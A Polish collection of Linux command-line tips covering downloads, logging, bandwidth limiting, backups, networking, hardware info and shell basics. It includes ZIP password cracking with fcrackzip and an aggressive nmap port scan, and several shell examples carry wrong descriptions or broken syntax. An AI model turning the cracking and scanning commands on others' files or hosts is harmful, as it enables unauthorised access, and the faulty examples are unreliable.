Zobacz także:

    * Użyteczne porady

wget -r -l 10 -nc -U --no-parent http://www.jakas.witryna.com.pl

..ciekawsze opcje:
-c ...kontynuacja ściąganego pliku

-i {plik_z_adresami_http/ftp} ...przekazanie wgetowi z pliku adresów z których ma nastąpić ściąganie.

-U ...przełącznik ten pozwala na podanie alternatywnych nagłówków, niektóre serwery Internet Explorera przekierowują do właściwych zasobów, natomiast wgeta odsyłają do /dev/null.

-r ...rekursywne pobieranie katalogów.

-m# ...mirror witryny.

-------------

Logi na 12-tej konsoli
Zobacz także:

    * Administracja
    * syslog
    * Użyteczne porady

sudo mcedit /etc/syslog.conf

 

i dopisujemy:

*.* -/var/log/all.log
*.* /dev/tty12

 

pierwsza linijka zapisuje logi do pliku /var/log/all.log, a kolejna wysyła logi na 12-tą konsolę.

 

Resetujemy demona logowania:
/etc/init.d/sysklogd restart lub killall -HUP syslogd

 

W środowisku graficznym możemy z poziomu okna terminala podgladać zawartość logów na bieżąco dzięki poleceniu:
tail -f /var/log/all.log

-------------------------
Fcrackzip - czyli łamiemy hasła archiwum zip
Zobacz także:

    * fcrackzip
    * password

Instalacja
sudo apt-get install fcrackzip

 

Użycie
fcrackzip [-bDBchVvplum2] [--brute-force] [--dictionary] [--benchmark] [--charset characterset] [--help] [--validate] [--verbose] [--init-password string/path] [--length min-max] [--use-unzip] [--method name] [--modulo r/m] file…

Przykłady
Użycie kombinacji 6 (sześciu) małych znaków jako hasła:
fcrackzip -c a -p aaaaaa archiwum.zip

Inne:
fcrackzip --method cpmask --charset A --init AAAA test.ppm
fcrackzip -D -p lista_hasel.txt archiwum.zip

-----------------------------
Monitorujemy zmiany w systemie plików (dnotify)
Zobacz także:

    * Administracja
    * dnotify
    * Użyteczne porady

Natychmiastowe wykonanie czynności przy zachodzących zmianach w systemie plików.

 

System linux potrafi monitorować obiekty w systemie plików i powiadamiać o zachodzących zmianach. Z pomocą przychodzi nam polecenie dnotify za pomocą którego możemy wykonać np. coś takiego:
dnotify --background --silent --create ~/katalog/ --execute ~/bin/skrypt.sh

 

Polecenie to natychmiast uruchomi "skrypt.sh" po utworzeniu jakiegoś pliku w katalogu "/katalog", gdzie:
-A, --access (dostęp)
-M, --modify (modyfikacja)
-C, --create (utworzenie)
-D, --delete (skasowanie)
-R, --rename (zmiana nazwy)
-B, --attrib (zmiana atrybutów)
-a, --all (wszystkie wcześniejsze)
-e, --execute=COMMAND.. (wykonaj polecenie)
reszta opcji jest w manualu.

 

Oczywiście ktoś może powiedzieć, że coś takiego można zlecić do "crona" - ale czy aby napewno cron wykona daną czynność wtedy i tylko wtedy gdy zaistnieje zmiana w systemie plików i to ze skutkiem natychmiasowym? :)

-----------------------
Mirror katalogu ftp
Zobacz także:

    * Backup
    * FTP
    * Użyteczne porady

Wykonanie mirrora katalogu ze zdalnego serwera

lftp -c 'open -e "mirror backup_stronki katalog_zdalny" ftp://user:haslo@ftp.60free.ovh.org'

Polecam zapoznać się z manualem dotyczącym opcji mirror, a także synchronizacji tylko
nowszych plików. Mirror można wykonywać w dowolną stronę, tzn. na lub z serwera.

Sposób na mirror można bardziej zautomatyzować, ale to już kwestia gustu.

-----------------
Jak sprawdzić który proces korzysta z pliku, katalogu lub gniazda
Zobacz także:

    * fuser

Przydatne linki:
http://ptm.linux.pl/man_HTML/man1/fuser.1.html


fuser -v -m /home

Aby zabić wszystkie te procesy, wydaj polecenie:

fuser -k -v -m /home

 

lub, aby je zakończyć sygnałem SIGTERM (normalne zakończenie)

fuser -k -TERM -v -m /home
--------------------------------


Testujemy serwis www (httping)
Zobacz także:

    * httping
    * Sieć

o2.pl

httping -G -b -g http://o2.pl

----------------------------
Trickle - ograniczamy łącze dla wybranej aplikacji
Zobacz także:

    * Sieć
    * trickle

Trickle jest lekkim limiterem łącza dla aplikacji takich jak: wget, firefox lub innych nie wymagająca uprawnień root'a.
Trickle, pozwala ręcznie ograniczyć / ustawić pasmo łącza dla jednej konkretnej aplikacji.

Istnieje również możliwość uruchomienia Trickled, ustawiając globalne parametry upload/download.

1. Instalacja

sudo apt-get install trickle


2. Przykłady użycia trickle:
Ograniczamy wget do 30KB/s ściągania

trickle -d 30 wget http://jakas.strona.pl/plik.bz2

 

Transmission upload/download

trickle -u 30 -d 30 transmission

 

Firefox

trickle -d 30 -u 30 firefox

 

Update-Manager (Ubuntu)

trickle -d 30 update-manager

Teraz możemy dalej grać po sieci a aktualizacje się ciągną :)

 

3. Opcje dla "trickle"
-d pobieranie (download)
-u wysyłanie (upload)

 

4. Przykłady użycia trickled:
Globalne ustawienie przepustowości na 30KB/s

trickled -u 30 -d 30

lub specyficznie dla różnych usług:

trickled -u 30 -d 30 -c plik_konfiguracyjny.conf

Polecam zapoznać się z:

man trickled.conf
man trickled

 

Zobacz również:
http://monkey.org/~marius/pages/?page=trickle

--------------------------
Giplet - aktualne IP na panelu
Zobacz także:

    * Desktop
    * giplet

Zobacz zrzut ekranu: http://giplet.sourceforge.net/

 

1. Instalacja:

sudo apt-get install giplet


•	alias l='ls -l --color=auto'	Pokazuje zawartość katalogu
•	ls -lrt	Pokazuje zawartość katalogu według daty. Zobacz też newest oraz find_mm_yyyy
•	ls /usr/bin | pr -T9 -W$COLUMNS	Pokazuje zawartość katalogu w dziewięciu kolumnach
 	find -name '*.[ch]' | xargs grep -E 'expr'	Szuka wyrazu 'expr' w obecnym katalogu i poniżej. Zobacz też findrepo
 	find -type f -print0 | xargs -r0 grep -F 'example'	Szuka danego wyrazu tylko w nazwie pliku w obecnym katalogu i poniżej
 	find -maxdepth 1 -type f | xargs grep -F 'example'	Szuka danego wyrazu tylko w nazwie pliku w obecnym katalogu
 	find -maxdepth 1 -type d | while read dir; do echo $dir; echo cmd2; done	Wykonuje (w pętli) wiele komend dla każdego znalezionego wiersza
•	find -type f ! -perm -444	Znajduje pliki nie mogące zostać odczytane przez nikogo (pożyteczne na serwerach www)
•	find -type d ! -perm -111	Znajduje katalogi niedostępne dla żadnego użytkownika (pożyteczne na serwerach www)
•	locate -r 'file[^/]*\.txt'	Search cached index for names. This re is like glob *file*.txt
•	look reference	Sprawdza (wg. Kolejności) wyraz w słowniku
•	grep --color reference /usr/share/dict/words	Podkreśla trafienia dla danego wyrażenia znalezione w słowniku
Kopie zapasowe i kompresja
 	gpg -c file	Szyfruje plik
 	gpg file.gpg	Odszyfrowuje plik
 	tar -c dir/ | bzip2 > dir.tar.bz2	Tworzy skompresowaną kopię katalogu dir/
 	bzip2 -dc dir.tar.bz2 | tar -x	Odtwarza zawartość kopii (dla plików tar.gz użyj gzip zamiast bzip2)
 	tar -c dir/ | gzip | gpg -c | ssh user@remote 'dd of=dir.tar.gz.gpg'	Tworzy skompresowaną i zaszyfrowana kopię katalogu /dir a następnie kopiuje go na inny komputer
 	find dir/ -name '*.txt' | tar -c --files-from=- | bzip2 > dir_txt.tar.bz2	Tworzy kopię z części plików zawartych w katalogu dir/ oraz innych w nim zawartych
 	find dir/ -name '*.txt' | xargs cp -a --target-directory=dir_txt/ --parents	Kopiuje część plików zawartych w katalogu dir/ oraz innych w nim zawartych do katalogu dir_txt
 	( tar -c /dir/to/copy ) | ( cd /where/to/ && tar -x -p )	Kopiuje (wraz z prawami) katalog copy/ do katalogu /where/to
 	( cd /dir/to/copy && tar -c . ) | ( cd /where/to/ && tar -x -p )	Kopiuje (wraz z prawami) zawartość katalogu copy/ do katalogu /where/to
 	( tar -c /dir/to/copy ) | ssh -C user@remote 'cd /where/to/ && tar -x -p' 	Kopije (wraz z prawami) katalog copy/ na inny komputer remote:/where/to/
 	dd bs=1M if=/dev/sda | gzip | ssh user@remote 'dd of=sda.gz'	Tworzy kopię dysku na innym komputerze
rsync (Network efficient file copier: do testów służy opcja --dry-run)
 	rsync -P rsync://rsync.server.com/path/to/file file	Pobiera tylko różnice. W razie problemów z połączeniem można używać wielokrotnie
 	rsync --bwlimit=1000 fromfile tofile	Kopiuje lokalnie z ograniczeniem maksymalnej prędkością. Rodzaj nice dla operacji WE/WY
 	rsync -az -e ssh --delete ~/public_html/ remote.com:'~/public_html'	Tworzy mirror strony (wraz kompresją i szyfrowaniem danych)
 	rsync -auz -e ssh remote:/dir/ . && rsync -auz -e ssh . remote:/dir/	Synchronizuje aktualny katalog z katalogiem na serwerze
ssh (Secure SHell)
 	ssh $USER@$HOST command	Wykonuje command na $HOST jako $USER (standardowo commend to shell)
•	ssh -f -Y $USER@$HOSTNAME xeyes	Wykonuj GUI command na $HOST jako $USER
 	scp -p -r $USER@$HOST: file dir/	Kopiuje wraz z prawami na $HOST do katalogu domowego użytkownika $USER
 	ssh -g -L 8080:localhost:80 root@$HOST	Przekazuje połączenia do $HOSTNAME:8080 na $HOST:80
 	ssh -R 1434:imap:143 root@$HOST	Przekazuje połączenie z $HOST:1413 na imap:143
wget (multi purpose download tool)
•	(cd cli && wget -nd -pHEKk http://www.pixelbeat.org/cmdline.html)	Tworzy kopię strony internetowej w lokalnym katalogu
 	wget -c http://www.example.com/large.file	Kontynuuje pobieranie częściowo ściągniętego pliku
 	wget -r -nd -np -l1 -A '*.jpg' http://www.example.com/dir/	Kopiuje zbiór plików do lokalnego katalogu
 	wget ftp://remote/file[1-9].iso/	FTP wspiera bezpośrednio wyrażenia regularne (globbing)
•	wget -q -O- http://www.pixelbeat.org/timeline.html | grep 'a href' | head	Natychmiast przeszukuje dane
 	echo 'wget url' | at 01:00	Pobiera dany URL o 1 w nocy do obecnego katalogu
 	wget --limit-rate=20k url	Pobiera z małym priorytetem (w tym wypadku limit to 20KB/s)
 	wget -nv --spider --force-html -i bookmarks.html	Sprawdza linki w pliku
 	wget --mirror http://www.example.com/	Efektywnie uaktualnia lokalna kopię strony (można użyć w programie cron)
sieć (Uwaga komendy ifconfig, route, mii-tool, nslookup są przestarzałe)
 	ethtool eth0	Pokazuje status urządzenia sieciowego eth0
 	ethtool --change eth0 autoneg off speed 100 duplex full	Ręcznie ustawia prędkość urządzenia sieciowego
 	iwconfig eth1	Pokazuje status urządzenia bezprzewodowego eth1
 	iwconfig eth1 rate 1Mb/s fixed	Ręcznie ustawia prędkość urządzenia bezprzewodowego
•	iwlist scan	Pokazuje dostępne sieci bezprzewodowe
•	ip link show	Pokazuje urządzenia sieciowe
 	ip link set dev eth0 name wan	Zmienia nazwę urządzenia eth0 na wan
 	ip link set dev eth0 up	Włącza (lub wyłacza) urządzenie sieciowe eth0
•	ip addr show	Pokazuje adresy urządzeń
 	ip addr add 1.2.3.4/24 brd + dev eth0	Dodaje (lub kasuje) adres IP i maskę sieciową (255.255.255.0)
•	ip route show	Pokazuje ruting
 	ip route add default via 1.2.3.254	Ustawia standardową bramkę wyjścia na 1.2.3.254
•	tc qdisc add dev lo root handle 1:0 netem delay 20msec	Dodaje opóźnienie 20ms do sterownika urządzenia (przydatne w czasie testów)
•	tc qdisc del dev lo root	Usuwa opóźnienie dodane powyżej
•	host pixelbeat.org	Pokazuje informacje IP dla nazwy DNS albo na odwrót
•	hostname -i	Pokazuje lokalny adres ip (równoważne z host `hostname`)
•	whois pixelbeat.org	Pokazuje informacje whois dla nazwy lub adresu IP
•	netstat -tupl	Pokazuje usługi internetowe
•	netstat -tup	Pokazuje aktywne usługi internetowe z i do komputera
sieć w systemie Windows (uwaga: pakiet samba udostępnia w całości narzędzia związane z usługami sieciowymi systemu Windows)
•	smbtree	Pokaż komputery z Windowsem. Zobacz też polecenie findsmb
 	nmblookup -A 1.2.3.4	Pokaż windowsową nazwę (netbios) dla danego adresu ip
 	smbclient -L windows_box	Pokaz katalogi współdzielone na komputerze z Windowsem lub serwerze samby
 	mount -t smbfs -o fmask=666,guest //windows_box/share /mnt/share	Podłącz katalog współdzielony
 	echo 'message' | smbclient -M windows_box	Wyślij wiadomość popup do komputera z windowsem (w XP SP2 standardowo wyłączone)
text manipulation (uwaga: sed używa stdin i stdout, zatem jeśli chcesz zmienić plik dodaj <oldfile >newfile)
 	sed 's/string1/string2/g'	Zastępuje wyraz1 na wyraz2
 	sed 's/\(.*\)1/\12/g'	Zmienia dowonywyraz1 na dowolnywyraz2
 	sed '/ *#/d; /^ *$/d'	Usuwa komentarze i puste linie
 	sed ':a; /\\$/N; s/\\\n//; ta'	Łączy wszystkie linie oddzielając je znakiem \
 	sed 's/[ \t]*$//'	Usuwa puste znaki z linii
 	sed 's/\([\\`\\"$\\\\]\)/\\\1/g'	Opuszcza metaznaki powłoki aktywne wewnątrz cudzysłowia
•	seq 10 | sed "s/^/      /; s/ *\(.\{7,\}\)/\1/"	Justuje numery do prawej
 	sed -n '1000p;1000q'	Pokazuje tysięczną linię
 	sed -n '10,20p;20q'	Pokazuje linie od 10 do 20
 	sed -n 's/.*<title>\(.*\)<\/title>.*/\1/ip;T;q'	Pokazuje tytuł stron internetowej napisanej w HTML
 	sort -t. -k1,1n -k2,2n -k3,3n -k4,4n	Sortuje adresy IPV4 ip
•	echo 'Test' | tr '[:lower:]' '[:upper:]'	Zmienia wielkość znaków
•	tr -dc '[:print:]' < /dev/urandom	Filtruje znaki nie dające się wydrukować
•	history | wc -l	Liczy linie
operacje na zbiorach (uwaga: Aby przyśpieszyć działanie można ustawić następującą zmienną export LANG=C. Tym samym zakłada się brak identycznych linii w pliku)
 	sort file1 file2 | uniq	Połączenie nieposortowane plików
 	sort file1 file2 | uniq -d	Część wspólna nieposortowane plików
 	sort file1 file1 file2 | uniq -u	Różnica nieposortowane plików
 	sort file1 file2 | uniq -u	Symetryczna różnica nieposortowane plików
 	join -a1 -a2 file1 file2	Połączenie posortowane plików
 	join file1 file2	Część wspólna posortowane plików
 	join -v2 file1 file2	Różnica posortowane plików
 	join -v1 -v2 file1 file2	Symetryczna różnica posortowane plików
metematyka
•	echo '(1 + sqrt(5))/2' | bc -l	Proste obliczenia (obliczenie φ). Zobacz też bc
•	echo 'pad=20; min=64; (100*10^6)/((pad+min)*8)' | bc	Bardziej skomplikowane obliczenia (int). To pokazuje maksymalne prędkość FastEthernet
•	echo 'pad=20; min=64; print (100E6)/((pad+min)*8)' | python	Python potrafi obsłużyć notacje naukową
•	echo 'pad=20; plot [64:1518] (100*10**6)/((pad+x)*8)' | gnuplot -persist	Prędkość FastE w relacji do wielkości pakietu
•	echo 'obase=16; ibase=10; 64206' | bc	Konwertuje liczby dziesiętne do szesnastkowych
•	echo $((0x2dec))	Konwertuje liczby szesnastkowe do dziesiętnych ((arytmetyczne rozszerzenie powłoki))
•	units -t '100m/9.74s' 'miles/hour'	Konwersja jednostek (dziesiętne do calowych)
•	units -t '500GB' 'GiB'	Konwersja jednostek (z SI do IEC)
•	units -t '1 googol'	Definiuje jednostkę
•	seq 100 | (tr '\n' +; echo 0) | bc	Dodaje kolumne z cyframi. Zobacz też add i funcpy
kalendarz
•	cal -3	Pokazuje kalendarz
•	cal 9 1752	Pokazuje kalendarz dla danego miesiąca i roku
•	date -d fri	Pokazuję datę najbliższego piątku. Zobacz też day
•	date --date='25 Dec' +%A	W jaki dzień wypada w tym roku Boże Narodzenie
•	date --date '1970-01-01 UTC 2147483647 seconds'	Konwertuje sekundy, które upłynęły od początku epoki uniksa w datę
•	TZ=':America/Los_Angeles' date	Pokazuję godzinę na zachodnim wybrzeżu USA (użyj tzselect aby wybrać daną strefę czasową)
 	echo "mail -s 'get the train' P@draigBrady.com < /dev/null" | at 17:45	Wysyła email z przypomnieniem
•	echo "DISPLAY=$DISPLAY xmessage cooker" | at "NOW + 30 minutes"	Pokazuje okienko z przypomnieniem
ustawienia lokalne
•	printf "%'d\n" 1234	Pokazuje liczbę z grupowaniem tysięcznym zgodnym z ustawieniami lokalnymi
•	BLOCK_SIZE=\'1 ls -l	Pokazuje grupowanie tysięczne podczas użycia komendy ls
•	echo "I live in `locale territory`"	Pokazuje informacje o ustawieniach lokalnych
•	LANG=en_IE.utf8 locale int_prefix	Pokazuje lokalne informacje dla danego kraju. Zobacz też ccodes
•	locale | cut -d= -f1 | xargs locale -kc | less	Pokazuje pola dostępne w lokalnej bazie
recode (Polecenia iconv, dos2unix, unix2dos są przestarzałe)
•	recode -l | less	Pokazuje dostępne konwersje (aliasy na każdej linii)
 	recode windows-1252.. file_to_change.txt	Windows "ansi" do lokalnego kodowania (automatyczna konwersja CRLF )
 	recode utf-8/CRLF.. file_to_change.txt	Windows utf8 do lokalnego kodowania
 	recode iso-8859-15..utf8 file_to_change.txt	Latin9 (europa zachodnia) to utf8
 	recode ../b64 < file.txt > file.b64	Kodowanie Base64
 	recode /qp.. < file.txt > file.qp	Quoted printable decode
 	recode ..HTML < file.txt > file.html	Tekst to HTML
•	recode -lf windows-1252 | grep euro	Pokazuje informacje o danym znaku
•	echo -n 0x80 | recode latin-9/x1..dump	Pokazuje informacje o znaku w kodowaniu latin-9
•	echo -n 0x20AC | recode ucs-2/x2..latin-9/x	Pokazuje kodowanie latin-9
•	echo -n 0x20AC | recode ucs-2/x2..utf-8/x	Pokazuje kodowanie utf-8
CDs
 	gzip < /dev/cdrom > cdrom.iso.gz	Tworzy skompresowaną kopię CD
 	mkisofs -V LABEL -r dir | gzip > cdrom.iso.gz	Tworzy skompresowaną kopię CD z zawartości danego katalogu
 	mount -o loop cdrom.iso /mnt/dir	Podłącza (tylko odczyt) kopię CD do katalogu /mnt/dir
 	cdrecord -v dev=/dev/cdrom blank=fast	Kasuje dysk CDRW
 	gzip -dc cdrom.iso.gz | cdrecord -v dev=/dev/cdrom -	Wypala CD z pliku (użyj dev=ATAPI -scanbus aby upewnić się co do urządzenia)
 	cdparanoia -B	Kopiuje ścieżki audio z CD jako pliki wav do bieżącego katalogu
 	cdrecord -v dev=/dev/cdrom -audio *.wav	Tworzy audio CD ze wszystkich plików wav z bieżącego katalogu (Zobacz też cdrdao)
 	oggenc --tracknum='track' track.cdda.wav -o 'track.ogg'	Tworzy pliki ogg z plików wav
disk space (Zobacz też FSlint)
•	ls -lSr	Pokazuje pliki według wielkości, największe na końcu
•	du -s * | sort -k1,1rn | head	Pokazuje katalogii zajmujących największą ilość miejsca w bieżącym katalogu. Zobacz też dutop
•	df -h	Pokazuje wolne miejsce na podłączonych systemach plików
•	df -i	Pokazuje wolne inodes na podłączonych systemach plików
•	fdisk -l	Pokazuje wielkość dysków i typ partycji (jako root)
•	rpm -q -a --qf '%10{SIZE}\t%{NAME}\n' | sort -k1,1n	Pokazuje wszystkie zainstalowane pakiety według wielkości (Bytes) w dystrybucjach używających rpm
•	dpkg-query -W -f='${Installed-Size;10}\t${Package}\n' | sort -k1,1n	Pokazuje wszystkie zainstalowane pakiety według wielkości (KBytes) w dystrybucjach używających deb
•	dd bs=1 seek=2TB if=/dev/null of=ext3.test	Tworzy duży plik testowy (nie zajmując w ogóle miejsca). Zobacz też truncate
monitorownie/debugowanie
•	tail -f /var/log/messages	Monitoruje informacje w logu
•	strace -c ls >/dev/null	Pokazuje podsumowanie/profil wywołań systemowych danej komendy
•	strace -f -e open ls >/dev/null	Pokazuje wywołania systemowe danej komendy
•	ltrace -f -e getenv ls >/dev/null	Pokazuje wywołania biblioteczne danej komendy
•	lsof -p $$	Pokazuje ścieżki otwarte przez ten proces
•	lsof ~	Pokazuje procesy ktore mają otwartą daną ścieżkę
•	tcpdump not port 22	Pokazuje aktywność sieciową za wyjątkiem ssh. Zobacz też tcpdump_not_me
•	ps -e -o pid,args --forest	Pokazuje procesy wg hierarchii
•	ps -e -o pcpu,cpu,nice,state,cputime,args --sort pcpu | sed '/^ 0.0 /d'	Pokazuje procesy wg % użycia procesora
•	ps -e -orss=,args= | sort -b -k1,1n | pr -TW$COLUMNS	Pokazuje procesy wg użycia pamięci. Zobacz też ps_mem.py
•	ps -C firefox-bin -L -o pid,tid,pcpu,state	Pokazuje wszystkie wątki danego procesu
•	ps -p 1,2	Pokazuje informacje dla procesu o danym id
•	last reboot	Pokazuje historię ostatnich uruchomień
•	free -m	Pokazuje ilość wolnej pamięci RAM (-m w MB)
•	watch -n.1 'cat /proc/interrupts'	Pokazuje zmiany danych aktualnie się zmieniających
informacje o systemie (zobacz też sysinfo) ('#' znaczy, że musi być wykonane z prawami root)
•	uname -a	Pokazuje wersje jądra i architekturę systemu
•	head -n1 /etc/issue	Pokazuje nazwę i wersję linuksa
•	cat /proc/partitions	Pokazuje partycje zarejestrowane w systemie
•	grep MemTotal /proc/meminfo	Pokazuje informacje o pamięci RAM
•	grep "model name" /proc/cpuinfo	Pokazuje informacje o procesorze
•	lspci -tv	Pokazuje informacje o PCI
•	lsusb -tv	Pokazuje informacje o USB
•	mount | column -t	Pokazuje systemy plików podłączone do kuputera (informacje są wyjustowane)
#	dmidecode -q | less	Pokazuje informacje SMBIOS/DMI
#	smartctl -A /dev/sda | grep Power_On_Hours	Pokazuję całościowy czas pracy dysku
#	hdparm -i /dev/sda	Pokazuje informacje o dysku sda
#	hdparm -tT /dev/sda	Testuję prędkość odczytu dysku sda
#	badblocks -s /dev/sda	Szuka popsutych bloków na dysku sda
interactive (zobacz też linux keyboard shortcuts)
•	readline	Edytor linowy używany przez bash, python, bc, gnuplot, ...
•	screen	Wirtualne terminale z możliwością odłączania oi podłączania
•	mc	Manager plików który może przeglądać rpm, tar, ftp, ssh, ...
•	gnuplot	Interaktywny i obsługujący skrypty program do rysowania
•	links	Przeglądarka internetowa
różne
•	alias hd='od -Ax -tx1z -v'	Podręczna zmiana hexdump. (zastosowanie np: • hd /proc/self/cmdline | less)
•	alias realpath='readlink -f'	Pokazuje ścieżkę w postaci kanonicznej. (usage e.g.: • realpath ~/../$USER)
•	set | grep $USER	Przeszukuje aktualne ustawienia środowiska
 	touch -c -t 0304050607 file	Zmienia datę pliku (YYMMDDhhmm)
•	python -c "import SimpleHTTPServer as ws; ws.test()"	Serve current directory tree at http://$HOSTNAME:8000/



----------------------------

# Wykonanie wielu komend w jednym ciągu
     $ pwd ; ls tmp ; echo "Hello world"
# Uruchamianie find w tle
     $ find . -name tmp.out -print &
# Łączenie wyjścia who z grep'em
     $ who | grep fred
# Rozmawiaj z fredem jeśli jest zalogowany
     $ { who | grep fred ;  } && talk fred
# Wyślij wynik ls do ls.out
     $ ls > ls.out
# Dołącz wynik ls do ls.out
     $ ls >> ls.out
# Wyślij zaporoszenie.txt do  jasia, kasi, krzysia
     $ mail jas kasia krzys < zaproszenie.txt
# Wyślij standartowy błąd xsend do stderr.out
     $ xsend file 2>stderr.out
# Wyświetl nazwy plików zaczynających się na z
     $ ls z*
# Wyświetl dwu-, trój- oraz czteroliterowe nazwy plików
     $ ls ?? ??? ????
# Wyświetl nazwy plików zaczynające się na a, b lub c
     $ ls [a-c]*
# Wyświetl nazwy plików, które nie kończą się na .c
     $ ls *[!.c]
# Przyporządkuj zmiennej NU liczbę zalogowanych użytkowników
     $ NU=`who | wc -l`
# Ustaw zmienną TOTAL do wartości sumy 4 + 3
     $ TOTAL=`expr 4 + 3`
# Ustaw i wyeksportuj zmienną LBIN
     $ LBIN=/usr/lbin; export LBIN
# Usuń zmienną LBIN
     $ unset LBIN
# Ustaw zmienną SYS do nazwy komputera (jeśli nie ustawiona), wyświetl
     $ echo ${SYS:=`uuname -l`}
# Wyświetl informację o błędzie jeśli zmiennaXBIN nie jest ustawiona
     $ : ${XBIN:?}
# Wyświetl $HOME ustawione na /home/anatole
     $ echo '$HOME ustawione na' $HOME
# Wyświetl wartość $TERM
     $ echo $TERM
# Przywróć na pierwszy plan pracę numer 3, będącą w tle
     $ fg %3
# Zatrzymaj pracę find
     $ stop %find
# Wyświetl liczbę parametrów pozycyjnych
     $ echo "There are $# positional parameters"
# Wyświetl wartość drugiego parametru pozycyjnego
     $ echo $2
# Wyświetl wszystkie informacje dotyczące bieżących prac
     $ jobs -l
# Zakończ pracę 5
     $ kill %5
# Zwiększ zmienną X
     $ X=`expr $X + 1`
# Ustaw zmienną X na 20 modulo 5
     $ X=`expr 20 % 5`
# Ustaw tryb diagnostyczny
     $ set -x
# Uruchom skrypt dbscript w trybie noexec
     $ sh -n dbscript
# Sprawdzaj, czy masz nowe listy co 2 minuty
     $ MAILCHECK=120; export MAILCHECK
# Ustaw podstawowy znak zachęty
     $ PS1='Witaj!'; export PS1
# Sprawdź, czy zmienna VAR jest ustawiona na 0
     $ [-z "$VAR"] && echo "VAR jest ustawiona na 0"
# Sprawdź, czy zmienna VAR jest ustawiona na ABC
     $ ["$VAR" = ABC ]
# Sprawdź, czy plik xfile jest pusty
     $ test ! -s xfile
# Sprawdź, czy tmp to katalog
     $ [ -d tmp ]
# Sprawdź, czy plik file ma atrybuty odczytu i zapisu
     $ test -r file -a -w file
# Wyświetl informację o błędzie, piknij w głośniczek
     $ echo "Nieoczekiwany błąd!\007"
# Wyświetl informację na standardowym wyjściu błędu
     $ echo "To idzie do stderr" >&2
# Wyświetl znak zachęty i czytaj odpowiedź do ODPOWIEDZ
     $ echo "Wpisz odpowiedź: \c"; read ODPOWIEDZ
# Zrób funkcję md, która tworzy katalog i wchodzi do niego
     $ md() { mkdir $1 && cd $1 ; pwd ; }
# Ustaw pułapkę tak, aby zignorować sygnały 2 i 3
     $  trap "" 2 3
# Ustaw zmienną X na 1, ale w trybie tylko do odczytu
     $ X=1 ; readonly X
# Ustaw zmienną VAR na 1, następnie wyeksportuj
     $ VAR=1 ; export VAR
# Ustaw parametr pozycyjny na A B C
     $ set A B C
# Ustaw limit tworzenia nowych plików do 1000 bloków
     $ ulimit 1000
# Wyłącz zrzuty core
     $ ulimit -c 0
# Dodaj zezwolenie zapisu grupy do maski tworzonego pliku
     $ umask 013
# Wyświetl pierwsze oraz trzecie pola z pliku
     $ awk '{print $1, $3}' plik
# Wyświetl siedem pierwszych znaków każdej linii z tplik
     $ cut –c1–7 tplik
# Wyświetl pierwsze i trzecie pola z pliku /etc/passwd
     $ cut –f1,3 –d":" /etc/passwd
# Wyświetl linie w imiona zaczynające się na A, B, C lub Z
     $ egrep '[A–C,Z]*' imiona
# Wyświetl linie z dict zawierające czteroznakowe wyrazy
     $ egrep '....' dict
# Wyświetl wpisy dla użytkowników używających powłoki Korn'a
     $ grep ":/bin/ksh$' /etc/passwd
# Wyświetl liczbę linii w uplik zawierających unix; zignoruj wielkość liter
     $ grep –c 'unix' uplik
# Wyświetl długości pierwszego pola z pliku
     $ nawk'{TMP=length($1);print $TMP}' plik
# Wyświetl pierwsze 10 linii tpliku
     $ nawk '{for (i=1; i<10; i++) \
     printf "%s\n", getline}' tplik
# Wyświetl zawartość bieżącego katalogu w trzech kolumnach
     $ ls | paste d" " – – –
# Wyświetl plik ze wszystkimi wystąpieniami nie zamienionymi na tak
     $ sed 's/nie/tak/g' plik
# Wyświetl tylko nazwę użytkownika
     $ id | sed 's/).*//' | sed 's/.*(//'
# Wyświetl plik z liniami zawierającymi wymazany wyraz unix
     $ sed '/unix/d' plik
# Wyświetl pierwsze 50 linii pliku
     $ sed 75q plik
# Posortuj /etc/passwd na podstawie id grup.
     $ sort -t":" -n +3 -4 /etc/passwd
# Zmień małe litery w pliku na duże
     $ cat plik | tr a-z A-Z
# Wyświetl sąsiednie, powtórzone linie w pliku
     $ uniq –d file
# Wyświetl liczbę znaków i słów w pliku
     $ wc –l plik
# Wyświetl liczbę plików .c w bieżącym katalogu
     $ ls *.c | wc -l

---------------------------

find -maxdepth 1 -name '*.[zZ][iI][pP]' -exec unzip -o '{}' ';'


----------------

Graphics card:
glxinfo - details about OpenGL, the Xserver, and your graphics card
glxinfo | grep direct - do you have direct 3d rendering?
glxinfo | grep vendor - graphics card vendor
lspci | grep VGA - specific graphics card model
glxgears - a simple 3d benchmark, prints frame rate to the terminal
xrandr - supported display resolutions

Audio:
lspci | grep Audio - audio controller
aplay --list-devices - more audio device information

Software versions:
cat /etc/issue - current distribution and version
apt-cache showpkg packagename - packagename’s version and dependencies
uname -r - Linux kernel version
uname -a - all kernel details

Networking:
lspci | grep Ethernet - Ethernet controllers
ifconfig - networking interfaces, IP addresses, and more

Processor:
cat /proc/cpuinfo - all processors, clock speeds, flags, and more
cat /proc/loadavg - processor load average for the last 1, 5, and 15 minutes
top - press C key to sort processes by CPU usage

Memory:
cat /proc/meminfo - amount of RAM and swap, and how much is being used for what
free -m - total, used, and free memory shown in MB
top - press M key to sort processes by memory usage

Hard disks:
df -H - partitions, as well as their mount-points and usage in GB
sudo fdisk -l - all partitions, their device names, and positions on disk

USB devices:
lsusb - USB buses and attached devices

Even more:
lshal -m - monitor for hardware changes
lspci - all PCI devices
hwinfo --short (install from package hwinfo) - overview of all hardware, as well as more detailed info
lshw - another program for listing hardware
lshw -html | w3m -T text/html - lists hardware with HTML output in the w3m web browser
uptime - current time elapsed since last reboot, users, and load average


------------------
Redirecting Ports Using iptables Prerouting

/sbin/iptables -t nat -I PREROUTING -p tcp --dport 587 -j REDIRECT --to-ports 25



----------------------

nmap -T Aggressive -A -v 127.0.0.1 -p 1-65000

Nmap - Network Mapper,
text by darkstar ( b4d4ss ) F. A. Hacking Team


Skaner sieciowy. Obecnie najlepsze narzedzie administracyjne dostepne bezplatnie w internecie. Pelnie swoich funkcji objawia nam z poziomu administratora czyli roota. Skaner przeznaczony jest pod systemy unixowe, jednakze jak pisze Fyodor jest mozliwosc kompilacji pod Windows, jednakze duza czesc opcji nie dziala.

